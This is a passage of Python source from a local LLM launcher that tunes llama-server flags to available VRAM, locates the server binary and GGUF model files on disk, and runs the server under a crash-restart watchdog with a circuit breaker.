    """Suggest llama-server flags for a (model, VRAM) pair.

    Uses GGUF header metadata (layer count, expert count, GQA config) when
    available for accurate KV cache + MoE expert offload math. Falls back to
    size-bucket heuristics when the header is unreadable. Returns the same
    keys the Settings drawer uses plus `notes` (multi-line reasoning) and
    `quant_downshift` (banner shown when the model needs heavy offload).

    Leaves ~8% VRAM headroom when GGUF math is exact, ~15% when falling back
    to filename heuristics. Disables speculative decoding for MoE because
    independent benchmarks show it's net-negative there.
    """
    profile = inspect_model(model_path)
    notes: list[str] = []
    size_gb = profile["size_gb"] or 0.0
    is_moe = profile["is_moe"]
    n_layer = profile.get("block_count", 0) or 0
    src = profile.get("metadata_source", "filename")
    vram = max(float(vram_gb or 0), 0)

    # Default flags everyone gets
    out = {
        "num_gpu": 99,                 # all non-MoE layers on GPU
        "n_cpu_moe": 0,                # MoE-only; auto below
        "kv_cache_type": "q8_0",       # best balance
        "num_ctx": 32768,
        "num_batch": 512,
        "n_ubatch": 0,                 # auto in spawn
        "num_thread": 0,               # auto = let llama-server pick
        "flash_attn": True,
        "spec_strategy": "ngram-mod",   # off | ngram-mod | draft-mtp — set per-model below
        "no_warmup": False,
        "enable_metrics": False,
        "quant_downshift": "",          # banner string; "" = no suggestion
    }

    if vram <= 0:
        out["notes"] = "no VRAM tier set — using safe defaults. set a tier and Suggest again."
        return out
    if size_gb <= 0:
        out["notes"] = "no model selected — pick a model first, then Suggest."
        return out

    # Useable VRAM budget. With exact GGUF-derived KV math we can run hot —
    # ~8% headroom for CUDA workspace + alignment. Filename fallback is fuzzier
    # so we leave more slack.
    headroom = 0.92 if src == "gguf" else 0.85
    budget_mb = vram * headroom * 1024
    if src == "gguf":
        moe_tag = ""
        if is_moe:
            moe_tag = (f" · MoE {profile['expert_count']} experts, "
                       f"{profile['expert_used_count']} active/token")
        notes.append(
            f"GGUF: {profile['architecture']} · {n_layer} layers · "
            f"GQA head_kv={profile['head_count_kv']} key_len={profile['key_length']}{moe_tag}"
        )
    else:
        notes.append("GGUF header unreadable — using size-bucket fallback (less accurate).")
    notes.append(f"VRAM budget: {vram:.1f} GB · usable {budget_mb/1024:.1f} GB ({int(headroom*100)}% of total).")

    # -- KV cache dtype --
    # q8_0 is the quality/cost sweet spot. We enforce it as a minimum to
    # guarantee zero perplexity loss, sacrificing context length instead if tight.
    if vram >= 24 and size_gb < vram * 0.4:
        out["kv_cache_type"] = "f16"
        notes.append("KV cache: f16 (you have headroom).")
    else:
        out["kv_cache_type"] = "q8_0"
        notes.append("KV cache: q8_0 (zero perplexity loss baseline).")

    # -- Context window + n_cpu_moe (joint optimization) --
    # The two settings are coupled: bigger ctx eats more KV cache VRAM, which
    # forces more expert offload, which slows tokens. We want the LARGEST ctx
    # whose required offload is still tolerable (here: ≤70% of layers). This
    # gives the user "biggest context that's still fast" instead of the old
    # "fixed 45%-of-budget cap that left context on the table".
    kv_per_1k = _kv_per_1k_mb(profile, out["kv_cache_type"], size_gb)
    # Compute buffer: ~1.5 GB for activations, scratch, CUDA workspace,
    # attention work area. Padded to accommodate explicit 512+ ubatch sizing.
    compute_buf_mb = 1536.0
    size_mb = size_gb * 1024
    # Tier ladder. We deliberately do NOT cap to GGUF-reported trained_max —
    # many GGUFs report a conservative trained context that the model handles
    # fine in practice (RoPE/YaRN scaling), and capping there was shrinking
    # context that previously worked. trained_max is shown in notes for info
    # but never enforced.
    trained_max = int(profile.get("context_length", 0) or 0)
    ctx_tiers = (262144, 131072, 98304, 65536, 49152, 32768, 24576, 16384, 12288, 8192, 4096)

    if is_moe and n_layer > 0:
        # Dense share: attention + embeddings + router + LM head. Empirically
        # ~10-15% for big MoEs, more for small ones. Bounded.
        dense_share = max(0.08, min(0.20, 1.5 / max(profile.get("expert_count", 8), 1) + 0.08))
        expert_total_mb = size_mb * (1 - dense_share)
        expert_per_layer_mb = expert_total_mb / n_layer
        # Offload tolerance: 70% means we're willing to push experts off GPU as
        # long as the active set + attention + KV cache still fit. Past 70%
        # the speed cost outweighs the context win.
        max_offload_layers = int(n_layer * 0.7)

        chosen_ctx = ctx_tiers[-1]  # smallest as fallback
        chosen_n_cpu_moe = n_layer  # max offload as fallback
        for tier in ctx_tiers:
            kv_mb = (tier / 1000.0) * kv_per_1k
            available_for_model = budget_mb - kv_mb - compute_buf_mb
            if available_for_model <= 0:
                continue  # KV alone busts the budget
            if available_for_model >= size_mb:
                # Whole model + KV + compute fits. No offload, max speed.
                chosen_ctx = tier
                chosen_n_cpu_moe = 0
                break
            shortfall = size_mb - available_for_model
            need_offload = int((shortfall + expert_per_layer_mb - 1) // expert_per_layer_mb)
            if need_offload <= max_offload_layers:
                chosen_ctx = tier
                chosen_n_cpu_moe = need_offload
                break
        out["num_ctx"] = chosen_ctx
        out["n_cpu_moe"] = chosen_n_cpu_moe
        kv_at_chosen = (chosen_ctx / 1000.0) * kv_per_1k
        if chosen_n_cpu_moe == 0:
            notes.append(
                f"context: {chosen_ctx:,} tokens · n_cpu_moe: 0 "
                f"(model fits fully in VRAM at this context, KV ≈ {kv_at_chosen:.0f} MB)."
            )
        else:
            notes.append(
                f"context: {chosen_ctx:,} tokens · n_cpu_moe: {chosen_n_cpu_moe} of {n_layer} "
                f"(KV ≈ {kv_at_chosen:.0f} MB; offloading {chosen_n_cpu_moe} expert layers to fit + leave room)."
            )
        # Quant downshift suggestion: if we're offloading more than half
        # the layers even at the chosen context, the user is leaving real
        # throughput on the table by not picking a smaller quant.
        if chosen_n_cpu_moe > n_layer * 0.5:
            cur_q = profile.get("quant", "Q4_K_M")
            suggest_q = "Q3_K_S" if cur_q.upper().startswith("Q4") else "IQ3_XS"
            out["quant_downshift"] = (
                f"Offloading {chosen_n_cpu_moe}/{n_layer} layers at {cur_q or 'this quant'}. "
                f"Grab the {suggest_q} variant for ~3-5x throughput with full context."
            )
    elif is_moe:
        # No layer count from GGUF — fall back to ratio formula + old context calc.
        ctx_budget_mb = budget_mb * 0.45
        max_ctx_tokens = int((ctx_budget_mb / kv_per_1k) * 1000) if kv_per_1k > 0 else 8192
        for tier in ctx_tiers:
            if max_ctx_tokens >= tier:
                out["num_ctx"] = tier
                break
        shortfall_gb = (size_gb * 1.1) - vram
        ratio = max(0.0, min(1.0, shortfall_gb / max(size_gb, 1)))
        out["n_cpu_moe"] = max(0, min(int(round(ratio * 50)), 60))
        notes.append(f"context: {out['num_ctx']:,} tokens (estimated — no layer count from GGUF).")
        notes.append(f"n_cpu_moe: {out['n_cpu_moe']} (estimated).")
    else:
        # Dense model: max context that fits alongside model weights.
        for tier in ctx_tiers:
            kv_mb = (tier / 1000.0) * kv_per_1k
            if size_mb + kv_mb + compute_buf_mb <= budget_mb:
                out["num_ctx"] = tier
                break
        else:
            out["num_ctx"] = ctx_tiers[-1]
        kv_at_chosen = (out["num_ctx"] / 1000.0) * kv_per_1k
        notes.append(
            f"context: {out['num_ctx']:,} tokens "
            f"(KV ≈ {kv_at_chosen:.0f} MB at {out['kv_cache_type']})."
        )
    if trained_max:
        notes.append(f"GGUF reports trained max {trained_max:,} tokens (informational, not enforced).")

    # -- num_gpu (dense partial offload) --
    if not is_moe and size_gb * 1024 > budget_mb:
        frac_on_gpu = max(0.2, budget_mb / (size_gb * 1024))
        if n_layer > 0:
            out["num_gpu"] = max(8, int(n_layer * frac_on_gpu))
            notes.append(
                f"num_gpu: {out['num_gpu']} of {n_layer} layers "
                f"(dense model too big — partial offload, expect slow tok/s)."
            )
            # Quant downshift hint for dense too
            if frac_on_gpu < 0.6:
                cur_q = profile.get("quant", "")
                suggest_q = "Q3_K_M" if cur_q.upper().startswith("Q4") else "Q4_K_S"
                out["quant_downshift"] = (
                    f"Only {int(frac_on_gpu*100)}% of layers fit on GPU. "
                    f"A smaller quant ({suggest_q}) would run much faster."
                )
        else:
            out["num_gpu"] = max(8, int(80 * frac_on_gpu))
            notes.append(f"num_gpu: {out['num_gpu']} layers (dense partial offload).")

    # -- Speculative decoding --
    # Three-way pick:
    #   1. If the model ships MTP heads (Qwen 3.5/3.6, DeepSeek V3/R1) → "draft-mtp".
    #      The model's own MTP heads draft 3 tokens/step; reported ~1.85x decode
    #      win on Qwen3.6 27B with ~75% acceptance. Beats both n-gram and off on
    #      these architectures and stays in-budget on MoE since drafts come from
    #      the same forward pass instead of pulling fresh experts.
    #   2. Else if MoE → "off". Independent benchmarks (RTX 3090 + Qwen3.6
    #      35B-A3B post llama.cpp #19493) show n-gram speculation is net-negative
    #      on MoE: every drafted token pulls a fresh expert through the memory
    #      hierarchy, even at 100% draft acceptance.
    #   3. Else (dense, non-MTP) → "ngram-mod". Free win, no model requirements.
    # Primary signal: GGUF metadata key "<arch>.nextn_predict_layers" set by
    # llama.cpp's own converter for MTP-capable arches. Reliable — no false
    # positives from filenames, no false negatives from non-canonical names.
    has_mtp = bool(profile.get("has_mtp", False))
    if not has_mtp and profile.get("metadata_source") != "gguf":
        # Fallback: filename / arch heuristic, for GGUFs that lost the metadata
        # during conversion or third-party repacks that didn't carry it through.
        name_blob = ((profile.get("name") or "") + " " + (profile.get("architecture") or "")).lower()
        _MTP_HINTS = (
            "qwen3.5", "qwen3.6", "qwen-3.5", "qwen-3.6", "qwen_3.5", "qwen_3.6",
            "qwen3_5", "qwen3_6", "qwen_3_5", "qwen_3_6",
            "deepseek-v3", "deepseek_v3", "deepseekv3",
            "deepseek-r1", "deepseek_r1", "deepseekr1",
        )
        has_mtp = any(h in name_blob for h in _MTP_HINTS)
        if has_mtp:
            _EXCLUDE_MTP = ("distil", "distill", "distilled", "glm")
            if any(e in name_blob for e in _EXCLUDE_MTP):
                has_mtp = False
    if has_mtp:
        out["spec_strategy"] = "draft-mtp"
        nextn = int(profile.get("nextn_predict_layers", 0) or 0)
        if nextn:
            notes.append(f"speculative decoding: draft-mtp ({nextn} MTP heads detected, ~1.85x decode win).")
        else:
            notes.append("speculative decoding: draft-mtp (MTP-capable model by name, ~1.85x decode win).")
    elif is_moe:
        out["spec_strategy"] = "off"
        notes.append("speculative decoding: OFF (n-gram is net-negative on MoE per public benchmarks).")
    else:
        out["spec_strategy"] = "ngram-mod"
        notes.append("speculative decoding: ngram-mod (free win on dense models).")

    # -- batch / ubatch --
    # When offloading to CPU, bigger batches dramatically improve prompt eval
    # because the PCIe transfer is amortized over more tokens. Default 512 is
    # too small for hybrid CPU/GPU.
    if out["n_cpu_moe"] > 0 or (not is_moe and out["num_gpu"] < 99):
        out["num_batch"] = 2048
        notes.append("batch: 2048 (offloading).")
    elif vram >= 24:
        out["num_batch"] = 2048
    elif vram >= 16:
        out["num_batch"] = 1024
        
    # Explicitly lock micro-batch to 512. Higher values on CPU-offloaded MoEs
    # cause massive L3 cache thrashing and RAM bandwidth bottlenecks.
    out["n_ubatch"] = 512

    out["notes"] = " ".join(notes)
    return out


def find_llama_bin() -> str:
    """Locate llama-server.exe — settings override > env > PATH > known dirs > recursive scan."""
    s = get_settings()
    explicit = (s.get("llama_bin") or "").strip()
    if explicit and safe_exists(explicit):
        return explicit
    env = (os.environ.get("ACCURETTA_LLAMA_BIN") or "").strip()
    if env and safe_exists(env):
        return env
    found = shutil.which("llama-server.exe") or shutil.which("llama-server")
    if found:
        return found
    
    home = Path.home()
    search_roots = [
        ROOT,
        home / "Downloads",
        home / "Desktop",
        home / "Documents",
        Path("C:/llama.cpp"),
    ]
    
    # Scan other drive letters for common top-level llama folders
    if os.name == "nt":
        for letter in "CDEFGHIJKLMNOPQRSTUVWXYZ":
            drive = Path(f"{letter}:\\")
            if safe_exists(drive):
                for candidate_folder in ["llama.cpp", "llama", "bin"]:
                    cand = drive / candidate_folder
                    if safe_exists(cand) and safe_is_dir(cand):
                        search_roots.append(cand)
                        
    seen_roots = set()
    valid_roots = []
    for r in search_roots:
        try:
            r_abs = str(r.resolve())
            if r_abs not in seen_roots and safe_exists(r) and safe_is_dir(r):
                seen_roots.add(r_abs)
                valid_roots.append(r)
        except Exception:
            continue
            
    pattern = "llama-server.exe" if os.name == "nt" else "llama-server"
    for root in valid_roots:
        depth = 3
        try:
            matches = safe_rglob_files(root, pattern, max_depth=depth)
            if matches:
                # Prioritize Release builds
                for m in matches:
                    if "release" in str(m).lower():
                        return str(m.resolve())
                return str(matches[0].resolve())
        except Exception:
            continue
            
    candidates = [
        home / ".unsloth/llama.cpp/build/bin/Release/llama-server.exe",
        home / ".unsloth/llama.cpp/build/bin/llama-server.exe",
        home / ".docker/bin/inference/llama-server.exe",
        home / "llama.cpp/build/bin/Release/llama-server.exe",
        home / "llama.cpp/llama-server.exe",
        Path("C:/llama.cpp/build/bin/Release/llama-server.exe"),
        Path("C:/llama.cpp/llama-server.exe"),
    ]
    for c in candidates:
        if safe_exists(c):
            return str(c)
            
    return ""



def _parse_llama_port() -> int:
    m = re.search(r":(\d+)", LLAMA)
    return int(m.group(1)) if m else 8080


def find_mmproj_for(model_path: str) -> str:
    """Look for a vision projector .gguf sitting next to the chosen model.
    Heuristic: scan the model's directory (and one level up) for files whose
    name contains 'mmproj' or 'mm-proj'. Returns the absolute path of the
    closest match, or '' when nothing plausible is on disk.
    Common upstream naming: `mmproj-Qwen2.5-VL-7B-Instruct-f16.gguf`,
    `model.mmproj.gguf`, `mm-projector.gguf`."""
    if not model_path:
        return ""
    mp = Path(model_path)
    if not safe_exists(mp):
        return ""
    candidates: list[Path] = []
    search_dirs = [mp.parent]
    if mp.parent.parent and mp.parent.parent != mp.parent:
        search_dirs.append(mp.parent.parent)
    seen: set[str] = set()
    for d in search_dirs:
        try:
            for p in d.glob("*.gguf"):
                key = str(p.resolve()).lower()
                if key in seen:
                    continue
                seen.add(key)
                lname = p.name.lower()
                if "mmproj" in lname or "mm-proj" in lname or "mm_proj" in lname:
                    candidates.append(p)
        except Exception:
            continue
    if not candidates:
        return ""
    # Prefer same-directory matches; then prefer names that share a token
    # with the model file (e.g. "qwen2.5-vl-7b" shows up in both).
    model_stem = mp.stem.lower()
    def score(p: Path) -> tuple[int, int, int]:
        same_dir = 0 if p.parent == mp.parent else 1
        # crude shared-substring score
        shared = 0
        for tok in re.split(r"[-_.]", model_stem):
            if len(tok) >= 3 and tok in p.stem.lower():
                shared += 1
        return (same_dir, -shared, len(p.name))
    candidates.sort(key=score)
    best = candidates[0]
    best_same_dir, best_neg_shared, _ = score(best)
    
    # If the projector shares at least one token with the model, it's a safe match.
    if best_neg_shared < 0:
        return str(best.resolve())
        
    # If it shares NO tokens (e.g. generic "mmproj-BF16.gguf"), only auto-load it
    # if it's the ONLY other .gguf file in the directory. In a crowded directory,
    # blindly attaching a generic projector to every model causes crashes.
    try:
        ggufs_in_dir = list(mp.parent.glob("*.gguf"))
        if len(ggufs_in_dir) <= 2:
            return str(best.resolve())
    except Exception:
        pass
        
    print(f"[llama] skipped generic projector {best.name} for {mp.name} (too ambiguous in a crowded directory)")
    return ""


def _is_mmproj_name(name: str) -> bool:
    """A vision projector (mmproj) is a .gguf that belongs to a multimodal model
    — it's loaded via --mmproj alongside the real model, not runnable on its own.
    Match the common naming so these stay out of the model picker."""
    l = (name or "").lower()
    return "mmproj" in l or "mm-proj" in l or "mm_proj" in l


def scan_gguf_dir(root: str) -> list[dict]:
    """List selectable .gguf models under root (recursive). Vision projectors
    (mmproj) are excluded — they're part of another model, not something you can
    load on its own. Returns [{name,path,size,modified_at}]."""
    if not root:
        return []
    try:
        files = safe_rglob_files(root, "*.gguf", max_depth=6)
    except Exception:
        return []
    out = []
    for p in files:
        if _is_mmproj_name(p.name):
            continue
        try:
            st = p.stat()
            out.append({
                "name": p.name,
                "path": str(p.resolve()),
                "size": st.st_size,
                "modified_at": int(st.st_mtime),
            })
        except Exception:
            continue
    out.sort(key=lambda m: m["name"].lower())
    return out


def find_all_gguf_files() -> list[dict]:
    """Scan common locations for .gguf files to offer frictionless onboarding.
    Returns list of dicts: [{name, path, size, modified_at}].
    """
    s = get_settings()
    mdir = (s.get("models_dir") or "").strip()
    
    search_roots = []
    
    # 1. Configured models_dir
    if mdir and safe_exists(mdir) and safe_is_dir(mdir):
        search_roots.append(Path(mdir))
        
    # 2. Home directories
    home = Path.home()
    for sub in ["models", "Downloads", "Desktop", "Documents"]:
        search_roots.append(home / sub)
        
    # 3. LM Studio locations
    search_roots.append(home / ".lmstudio" / "models")
    search_roots.append(home / ".cache" / "lm-studio" / "models")
    
    # 4. HuggingFace hub cache
    search_roots.append(home / ".cache" / "huggingface" / "hub")
    
    # 5. Ollama models
    search_roots.append(home / ".ollama" / "models")
    
    # 6. AccuTEST workspace (ROOT) and sibling folders (ROOT.parent)
    search_roots.append(ROOT)
    if ROOT.parent and ROOT.parent != ROOT:
        search_roots.append(ROOT.parent)
        
    # 7. Top-level folders named MODELS or models on all available drives
    if os.name == "nt":
        for letter in "CDEFGHIJKLMNOPQRSTUVWXYZ":
            drive = Path(f"{letter}:\\")
            if safe_exists(drive):
                # Smart candidate directories on non-OS/other drives
                for folder in [
                    "MODELS", "models", 
                    "llama.cpp", "llama", 
                    "LM Studio", "LM-Studio", "lmstudio", 
                    "Ollama", "ollama", 
                    "Downloads", "Documents", "Desktop"
                ]:
                    cand = drive / folder
                    if safe_exists(cand) and safe_is_dir(cand):
                        search_roots.append(cand)
    else:
        for folder in ["/models", "/MODELS"]:
            if safe_exists(folder) and safe_is_dir(folder):
                search_roots.append(Path(folder))

    # De-duplicate and validate search roots
    seen_roots = set()
    valid_roots = []
    for r in search_roots:
        try:
            r_abs = str(r.resolve())
            if r_abs not in seen_roots and safe_exists(r) and safe_is_dir(r):
                seen_roots.add(r_abs)
                valid_roots.append(r)
        except Exception:
            continue
            
    # Scan for *.gguf in all valid roots
    all_files = []
    seen_files = set()
    
    for root in valid_roots:
        try:
            found = safe_rglob_files(root, "*.gguf", max_depth=6)
            for p in found:
                if _is_mmproj_name(p.name):
                    continue   # vision projector, not a selectable model
                p_abs = str(p.resolve())
                if p_abs not in seen_files:
                    seen_files.add(p_abs)
                    try:
                        st = p.stat()
                        all_files.append({
                            "name": p.name,
                            "path": p_abs,
                            "size": st.st_size,
                            "modified_at": int(st.st_mtime),
                        })
                    except Exception:
                        continue
        except Exception:
            continue
            
    # Sort models by modified_at descending (newest first)
    all_files.sort(key=lambda m: (-m["modified_at"], m["name"].lower()))
    return all_files



class LlamaProcess:
    """Single llama-server subprocess; thread-safe start / stop / swap-model.

    Watchdog: a background thread polls every WATCHDOG_POLL_S and respawns
    the subprocess with the same args used last time start() succeeded, so a
    silent crash (OOM, signal, segfault) gets healed without user
    intervention. Three guardrails prevent the watchdog from being a foot-gun:

      1. _watchdog_disabled — set by stop_permanent() (the user clicked
         "Stop server" or asked the bridge to leave llama alone). Cleared on
         the next user-initiated start(). Prevents respawning a process the
         user is intentionally shutting down.

      2. Circuit breaker — if the process dies >=WATCHDOG_MAX_CRASHES times
         within WATCHDOG_WINDOW_S seconds, auto-restart suspends until the
         user manually calls start() again. Prevents a doomed config (bad
         model file, wrong mmproj, OOM with current ctx) from looping
         forever and burning the user's SSD.

      3. _watchdog_stop event — set by shutdown_watchdog() during bridge
         exit. The thread checks this before AND after every sleep so it
         exits within ~5s of bridge shutdown, before the process tree
         tears down.
    """

    WATCHDOG_POLL_S = 5.0
    WATCHDOG_MAX_CRASHES = 3
    WATCHDOG_WINDOW_S = 60.0

    def __init__(self):
        self._lock = threading.RLock()
        self._proc: Optional[subprocess.Popen] = None
        self._loaded_model: str = ""
        # Vision projector path the current process was started with (empty
        # string means text-only). is_vision_capable() reads this so the chat
        # handler can skip the describe_image side-trip when the live model
        # already speaks images natively.
        self._loaded_mmproj: str = ""
        # Watchdog bookkeeping.
        self._last_start_args: Optional[dict] = None
        self._watchdog_thread: Optional[threading.Thread] = None
        self._watchdog_stop = threading.Event()
        self._watchdog_disabled = False
        self._restart_failed = False
        self._restart_history: list[float] = []
        # True while a user-initiated start() is in flight. The watchdog
        # respects this so it doesn't see the brief proc-is-dead window
        # between stop() and the new spawn (e.g. settings reload, model
        # switch) and "helpfully" launch a second process with the old
        # args while the user's new one is still loading. Cleared in a
        # finally so it's always released, even on spawn failure.
        self._starting = False
        # Ring buffer of the child's combined stdout/stderr, drained by a daemon
        # reader thread, so the UI can show the llama.cpp backend (model-load
        # progress, errors) instead of a hidden or stray console window.
        self._log_lines: list[str] = []
        self._log_lock = threading.Lock()
        self._log_reader: Optional[threading.Thread] = None

    def loaded_model(self) -> str:
        with self._lock:
            return self._loaded_model

    def loaded_mmproj(self) -> str:
        with self._lock:
            return self._loaded_mmproj

    def is_vision_capable(self) -> bool:
        with self._lock:
            return bool(self._loaded_mmproj) and self._proc is not None and self._proc.poll() is None

    def is_running(self) -> bool:
        with self._lock:
            return self._proc is not None and self._proc.poll() is None

    def _append_log(self, line: str) -> None:
        with self._log_lock:
            self._log_lines.append(line)
            if len(self._log_lines) > 800:
                del self._log_lines[:-800]

    def _start_log_reader(self, proc: "subprocess.Popen") -> None:
        # Drain the child's combined stdout/stderr into the ring buffer. Daemon
        # thread; ends on EOF when the process exits or is respawned.
        def _pump():
            try:
                if not proc.stdout:
                    return
                for raw in iter(proc.stdout.readline, ""):
                    self._append_log(raw.rstrip("\r\n"))
            except Exception:
                pass
        t = threading.Thread(target=_pump, name="llama-log", daemon=True)
        t.start()
        self._log_reader = t

    def read_log(self, tail: int = 400) -> dict:
        running = self.is_running()
        model = self.loaded_model()
        with self._log_lock:
            lines = list(self._log_lines[-tail:])
        return {"running": running, "model": model, "lines": lines}

    def stop(self, timeout: float = 5.0) -> bool:
        with self._lock:
            p = self._proc
            self._proc = None
            self._loaded_model = ""
            self._loaded_mmproj = ""
        _llama_props_ctx_invalidate()
        if not p:
            return True
        try:
            p.terminate()
            try:
                p.wait(timeout=timeout)
            except subprocess.TimeoutExpired:
                p.kill()
                p.wait(timeout=2.0)
        except Exception:
            pass
        return True

    # ---- watchdog --------------------------------------------------------
    def stop_permanent(self, timeout: float = 5.0) -> bool:
        """User-initiated stop: terminate llama-server AND tell the watchdog
        not to respawn it. Use this for the UI 'Stop server' action. The next
        successful start() re-enables the watchdog automatically."""
        self._watchdog_disabled = True
        self._restart_history = []
        self._restart_failed = False
        return self.stop(timeout=timeout)

    def watchdog_status(self) -> dict:
        """Snapshot for the UI / debug endpoint."""
        return {
            "enabled": bool(get_settings().get("watchdog_enabled", True)),
            "disabled_by_user": self._watchdog_disabled,
            "circuit_tripped": self._restart_failed,
            "recent_crashes": len(self._restart_history),
            "max_crashes": self.WATCHDOG_MAX_CRASHES,
            "window_s": self.WATCHDOG_WINDOW_S,
            "running": self.is_running(),
            "thread_alive": self._watchdog_thread is not None and self._watchdog_thread.is_alive(),
            "has_last_args": self._last_start_args is not None,
        }

    def reset_circuit_breaker(self) -> None:
        """Clear the crash history so the watchdog will try again. Called
        implicitly by every user-initiated start()."""
        self._restart_history = []
        self._restart_failed = False
        self._watchdog_disabled = False

    def shutdown_watchdog(self) -> None:
        """Called from atexit / Ctrl+C handlers. Stops the watchdog thread
        cleanly so it doesn't try to respawn during process teardown."""
        self._watchdog_stop.set()
        t = self._watchdog_thread
        if t is not None and t.is_alive():
            t.join(timeout=2.0)

    def _ensure_watchdog(self) -> None:
        """Lazy-start the polling thread on the first successful start()."""
        if self._watchdog_thread is not None and self._watchdog_thread.is_alive():
            return
        self._watchdog_stop.clear()
        t = threading.Thread(target=self._watchdog_loop, name="llama-watchdog", daemon=True)
        self._watchdog_thread = t
        t.start()

    def _watchdog_loop(self) -> None:
        """Poll loop. Sleeps via Event.wait() so shutdown_watchdog() gets a
        prompt response. Exceptions are logged and swallowed — a watchdog
        that crashes itself defeats the whole point."""
        while not self._watchdog_stop.is_set():
            if self._watchdog_stop.wait(self.WATCHDOG_POLL_S):
                return
            try:
                self._maybe_restart()
            except Exception as e:
                print(f"[watchdog] error: {e!r}", file=sys.stderr)

    def _maybe_restart(self) -> None:
        """Per-tick check. Returns silently in any of the suspend states."""
        # Settings toggle (lets the user disable globally without losing
        # state). Check every tick so toggling in the UI takes effect on the
        # next poll, not on the next restart.
        try:
            if not bool(get_settings().get("watchdog_enabled", True)):
                return
        except Exception:
            pass
        if self._watchdog_disabled or self._restart_failed:
            return
        if self._starting:
            return  # user-initiated start() in flight; the brief proc-is-dead
                    # window between stop() and the new spawn is not a crash
        if self._last_start_args is None:
            return  # never had a successful start to remember
        if self.is_running():
            return  # process is fine

        # Process is dead. Apply the circuit breaker.
        now = time.time()
        self._restart_history = [t for t in self._restart_history if now - t < self.WATCHDOG_WINDOW_S]
        if len(self._restart_history) >= self.WATCHDOG_MAX_CRASHES:
            self._restart_failed = True
            msg = (
                f"llama-server crashed {len(self._restart_history)} times in "
                f"{int(self.WATCHDOG_WINDOW_S)}s; auto-restart suspended. "
                f"Fix the config (model path, ctx size, mmproj) and click "
                f"'Restart server' in Settings to resume."
            )
            print(f"[watchdog] {msg}", file=sys.stderr)
            try:
                broadcast_event({"type": "llama:watchdog_stuck", "message": msg})
            except Exception:
                pass
            return

        self._restart_history.append(now)
        # Exponential backoff: 2s, 4s, 8s. The wait is cancellable so a
        # graceful shutdown during backoff still exits in ~1s.
        delay = float(1 << len(self._restart_history))  # 2, 4, 8
        attempt = len(self._restart_history)
        print(
            f"[watchdog] llama-server is dead — restart attempt {attempt}/"
            f"{self.WATCHDOG_MAX_CRASHES} in {delay:.0f}s",
            file=sys.stderr,
        )
        try:
            broadcast_event({
                "type": "llama:watchdog_restart",
                "attempt": attempt,
                "delay": delay,
            })
        except Exception:
            pass
        if self._watchdog_stop.wait(delay):
            return  # bridge shutting down, abort restart

        try:
            args = dict(self._last_start_args)
        except Exception:
            args = {}
        # _last_start_args was captured at successful-start time; we DON'T
        # call reset_circuit_breaker() before the watchdog-driven restart
        # because we want each respawn attempt to count toward the limit.
        try:
            res = self.start(_from_watchdog=True, **args)
        except Exception as e:
            print(f"[watchdog] restart raised: {e!r}", file=sys.stderr)
            return
        if res.get("ok"):
            print(f"[watchdog] llama-server back up (pid {res.get('pid')})", file=sys.stderr)
            try:
                broadcast_event({"type": "llama:watchdog_restored", "pid": res.get("pid")})
            except Exception:
                pass
        else:
            print(f"[watchdog] restart failed: {res.get('error')}", file=sys.stderr)

    def start(self, model_path: str, wait: bool = True, wait_seconds: int = 120,
              _from_watchdog: bool = False,
              port_override: int = 0, mmproj_override: str = None,
              ctx_override: int = 0, ngl_override: int = -1) -> dict:
        # Thin wrapper that guards the call with the _starting flag so the
        # watchdog leaves us alone while a transition is in flight. Setting
        # the flag BEFORE reset_circuit_breaker() and BEFORE the inner stop()
        # closes the race that lets a settings-driven reload (which calls
        # self.stop() then re-spawns with new args) get caught by a
        # watchdog tick mid-load and spawn a duplicate process with the
        # OLD args. The finally clause guarantees the flag is released even
        # if _start_impl raises.
        self._starting = True
        try:
            return self._start_impl(model_path=model_path, wait=wait,
                                    wait_seconds=wait_seconds,
                                    _from_watchdog=_from_watchdog,
                                    port_override=port_override,
                                    mmproj_override=mmproj_override,
                                    ctx_override=ctx_override,
                                    ngl_override=ngl_override)
        finally:
            self._starting = False

    def _start_impl(self, model_path: str, wait: bool = True,
                    wait_seconds: int = 120,
                    _from_watchdog: bool = False,
                    port_override: int = 0, mmproj_override: str = None,
                    ctx_override: int = 0, ngl_override: int = -1) -> dict:
        # User-initiated start clears the circuit breaker and re-enables the
        # watchdog. Watchdog-initiated retries skip this so each attempt
        # counts toward the crash limit (otherwise the breaker never trips).
        if not _from_watchdog:
            self.reset_circuit_breaker()
        bin_path = find_llama_bin()
        if not bin_path:
            return {"ok": False, "error": "llama-server.exe not found. Set llama_bin in Settings or install llama.cpp."}
        if not model_path or not safe_exists(model_path):
            return {"ok": False, "error": f"model not found: {model_path}"}

        s = get_settings()
        port = port_override if port_override > 0 else _parse_llama_port()
        # Cap ctx to keep KV cache from blowing past VRAM. A 256k ctx with f16
        # KV on a 16-attn-head model burns ~16 GiB by itself, leaving nothing
        # for the weights and forcing layer offload to system RAM. 32k is a
        # sane chat default; users who want more can raise it knowing the cost.
        # Context size. Users can crank this past 65k now that --n-cpu-moe lets
        # them spill model weights instead of KV cache. Hard ceiling is 1M tokens.
        ctx_raw = ctx_override if ctx_override > 0 else int(s.get("num_ctx") or 32768)
        ctx = min(max(ctx_raw, 512), 1_048_576) if ctx_raw > 0 else 32768
        n_batch = max(int(s.get("num_batch") or 2048), 32)
        n_ubatch_raw = int(s.get("n_ubatch") or 0)
        n_ubatch = n_ubatch_raw if n_ubatch_raw > 0 else min(max(n_batch // 2, 512), 1024)
        ngl_setting = ngl_override if ngl_override >= 0 else int(s.get("num_gpu") or 99)
        ngl = -1 if ngl_setting >= 99 else ngl_setting
        n_threads = int(s.get("num_thread") or 0)  # 0 = let llama-server pick
        n_parallel = max(int(s.get("n_parallel") or 1), 1)
        n_cpu_moe = max(int(s.get("n_cpu_moe") or 0), 0)
        kv_type = (s.get("kv_cache_type") or "q8_0").strip().lower()
        if kv_type not in ("f16", "f32", "q8_0", "q4_0", "q5_0", "q5_1", "q4_1"):
            kv_type = "q8_0"
        flash_on = bool(s.get("flash_attn", True))
        # Three-way speculative strategy with legacy-flag honoring.
        #
        # Migration is trickier than it looks because DEFAULTS now carries
        # spec_strategy="ngram-mod", which gets merged into `s` for any
        # settings.json that pre-dates this field. That means a user whose
        # autotuner wrote `enable_speculative=false` (e.g. for an MoE model
        # where n-gram speculation is net-negative) would see their preference
        # silently overridden by the merged default — and llama-server crash
        # at startup with spec flags it shouldn't be getting.
        #
        # Rule: an EXPLICIT False on the legacy field always wins. That
        # preserves the autotuner's intent across the upgrade. Otherwise
        # spec_strategy is the source of truth.
        spec_strategy = (s.get("spec_strategy") or "").strip().lower()
        if s.get("enable_speculative") is False:
            spec_strategy = "off"
